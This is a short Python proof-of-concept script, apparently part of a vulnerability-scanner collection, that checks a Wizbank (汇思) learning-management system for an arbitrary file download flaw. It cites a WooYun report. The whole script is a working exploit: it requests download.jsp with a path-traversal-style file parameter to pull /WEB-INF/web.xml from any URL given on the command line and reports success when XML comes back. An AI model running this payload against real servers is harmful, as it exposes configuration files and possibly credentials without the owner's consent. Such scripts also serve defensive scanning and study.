#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇思学习管理系统任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2010-0149619
author: Lucifer
description: \www\cw\skin1\jsp\download.jsp源码中,未经过文件类型检查和过滤，直接下载文件
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class wizbank_download_filedownload():
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if req.headers["Content-Type"] == "application/xml":
                printGreen("[+]Success:存在wizbank学习管理系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在wizbank_download_filedownload漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = wizbank_download_filedownload(sys.argv[1])
    testVuln.run()